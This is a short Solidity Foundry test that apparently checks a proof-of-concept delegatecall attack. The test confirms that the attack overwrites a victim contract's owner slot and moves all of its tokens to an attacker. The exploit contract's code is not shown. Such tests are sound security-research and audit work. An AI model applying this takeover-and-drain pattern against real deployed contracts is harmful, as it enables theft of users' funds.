function test_DelegatecallTakeoverAndDrain() public {
    // 1. Setup initial state: Victim holds tokens, attacker is unprivileged
    uint256 victimBalanceBefore = token.balanceOf(address(victim));
    assertGt(victimBalanceBefore, 0, "Victim should have tokens");
    assertNotEq(victim.owner(), address(attacker));

    // 2. Execute exploit
    vm.prank(attacker);
    advancedTake.executeAttack(address(victim), address(token), attacker);

    // 3. Assertions proving complete compromise
    // Check 1: Slot 0 (owner) has been overwritten to the attacker
    assertEq(victim.owner(), attacker, "Ownership not seized");

    // Check 2: Funds have been successfully drained from the victim contract
    uint256 victimBalanceAfter = token.balanceOf(address(victim));
    uint256 attackerBalance = token.balanceOf(attacker);

    assertEq(victimBalanceAfter, 0, "Victim contract was not drained");
    assertEq(attackerBalance, victimBalanceBefore, "Attacker did not receive funds");
}

